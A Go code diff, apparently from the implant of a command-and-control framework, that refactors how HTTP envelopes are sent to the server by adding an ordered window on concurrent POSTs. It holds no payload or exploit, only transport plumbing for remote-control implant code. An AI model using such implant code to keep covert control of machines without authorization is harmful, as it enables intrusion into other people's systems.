@@ -652,6 +652,53 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 // {{end}} -IncludeWG
 
 // {{if .Config.IncludeHTTP}}
+const httpEnvelopeWriteWindow = 64
+
+type httpEnvelopeWriter interface {
+	WriteEnvelope(*pb.Envelope) error
+}
+
+// sendHTTPEnvelopes permits concurrent POSTs without allowing one stalled
+// request to be overtaken by an unbounded number of later envelopes. A slot is
+// retired in source order: request base+window cannot launch until base has
+// completed. The server acknowledges a POST only after synchronous dispatch,
+// so this also bounds handler-level reordering.
+func sendHTTPEnvelopes(connection *Connection, send <-chan *pb.Envelope, writer httpEnvelopeWriter, window int) {
+	if connection == nil || writer == nil {
+		return
+	}
+	if window <= 0 {
+		window = 1
+	}
+	retirements := make([]<-chan struct{}, 0, window)
+	for {
+		if len(retirements) == window {
+			select {
+			case <-connection.Done():
+				return
+			case <-retirements[0]:
+				retirements = retirements[1:]
+			}
+		}
+
+		envelope, ok := nextSendEnvelope(connection, send)
+		if !ok {
+			return
+		}
+		// {{if .Config.Debug}}
+		log.Printf("[http] send envelope ...")
+		// {{end}}
+		retired := make(chan struct{})
+		retirements = append(retirements, retired)
+		go func(envelope *pb.Envelope, retired chan<- struct{}) {
+			defer close(retired)
+			if err := writer.WriteEnvelope(envelope); err != nil {
+				connection.Cleanup()
+			}
+		}(envelope, retired)
+	}
+}
+
 func httpConnect(uri *url.URL) (*Connection, error) {
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
@@ -697,27 +744,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 
 		go func() {
 			defer connection.Cleanup()
-			sendSem := make(chan struct{}, 64)
-			for {
-				envelope, ok := nextSendEnvelope(connection, send)
-				if !ok {
-					return
-				}
-				// {{if .Config.Debug}}
-				log.Printf("[http] send envelope ...")
-				// {{end}}
-				select {
-				case sendSem <- struct{}{}:
-				case <-connection.Done():
-					return
-				}
-				go func(envelope *pb.Envelope) {
-					defer func() { <-sendSem }()
-					if err := client.WriteEnvelope(envelope); err != nil {
-						connection.Cleanup()
-					}
-				}(envelope)
-			}
+			sendHTTPEnvelopes(connection, send, client, httpEnvelopeWriteWindow)
 		}()
 
 		go func() {
